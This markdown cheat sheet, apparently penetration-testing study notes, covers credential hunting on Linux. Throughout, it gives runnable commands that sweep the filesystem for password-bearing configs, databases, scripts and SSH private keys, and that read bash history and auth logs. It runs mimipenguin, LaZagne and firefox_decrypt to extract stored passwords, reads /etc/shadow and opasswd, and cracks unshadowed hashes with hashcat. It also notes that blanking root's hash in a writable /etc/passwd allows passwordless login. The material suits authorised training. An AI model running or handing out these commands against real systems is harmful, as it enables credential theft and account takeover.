## Credential Hunting in Linux
```bash
# here are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to: 
1- Files , 2-  History , 3- Memory , 4- Key-Rings

1- # Files

## configs 
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done # auto search for  (user, password, pass) in conf file 

## Database
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

## notes 
find /home/* -type f -name "*.txt" -o ! -name "*.*"

## scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

## Cronjobs
cat /etc/crontab
ls -la /etc/cron.*/

## SSH Keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1" # SSH Private Keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1" # SSH Public Keys

-----------------------------------------------------------------
2- # History 
## Bash History
tail -n5 /home/*/.bash* 

## Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

------------------------------------------------------------------
3- # Memory and Cache

sudo python3 mimipenguin.py # Memory 
sudo python2.7 laZagne.py all
------------------------------------------------------------------
4- # Browsers
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

python3.9 firefox_decrypt.py #  Decrypting Firefox Credentials
python3 laZagne.py browsers
```

##  Passwd, Shadow & Opasswd
```bash
# Linux-based distributions  use [Pluggable Authentication Modules] (PAM)
# he modules used  `pam_unix.so` or `pam_unix2.so` located in `/usr/lib/x86_x64-linux-gnu/security/`
# The `pam_unix.so` s uses standardized API calls from the system libraries and files to update the account information for read, managed, and updated are `/etc/passwd` and `/etc/shadow`

 /etc/passwd
# username : passwd : UID : GID : comment : home dir : shell
# cry0l1t3:x:1000:1000:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
root:{hash}:0:0:root:/root:/bin/bash# on very old systems is the hash of the encrypted password in ('x') field
root::0:0:root:/root:/bin/bash # if it  writeable by mistake we can clear this field for the user `root` to login wihtout password

/etc/shadow
# username : encrypted pwd : lastchg : min : max : warn : inactive : expire : unused
# cry0l1t3:$6$wBRzy$...SNIP...x9cDWUxW1:18937:0:99999:7:::
root:*:18747:0:99999:7::: # If the password field contains `!` or `*` the user cannot log in with a Unix password. it use other methods for logging in, such as Kerberos or key-based authentication
$<type>$<salt>$<hashed> 
# $1$=MD5, $2a$=Blowfish, $2y$=Eksblowfish, $5$=SHA-256, $6$=SHA-512

## Opasswd
sudo cat /etc/security/opasswd  # old passwords hashes , it use MD5 (`$1$`) easy to crack then SHA-512

## Cracking Linux Credentials
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

```